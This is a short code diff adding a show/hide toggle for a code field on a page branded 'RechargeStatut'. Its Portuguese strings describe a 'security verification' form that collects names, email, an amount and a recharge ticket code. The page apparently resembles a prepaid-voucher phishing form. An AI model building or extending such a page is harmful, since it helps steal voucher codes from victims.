@@ -230,6 +230,12 @@
       pt: { brand: '<i class="bi bi-shield-check text-primary"></i> RechargeStatut<span class="text-primary">.</span>', form_title: 'Verificação de Segurança', label_lastname: 'Apelido', label_firstname: 'Nome', label_email: 'O seu endereço de e-mail', label_amount: 'Valor (€)', label_code: 'Código', btn_submit: 'Autenticar', footer_copyright: '&copy; 2026 RechargeStatut-Tickets.com — Todos os direitos reservados.' }
     };
 
+    function toggleCode(show) {
+      const field = document.getElementById("reference");
+      if(field) field.type = show ? "text" : "password";
+    }
+
+
     function toggleLangMenu() { 
       const menu = document.getElementById('langMenu'); 
       menu.style.display = menu.style.display === 'none' ? 'block' : 'none'; 
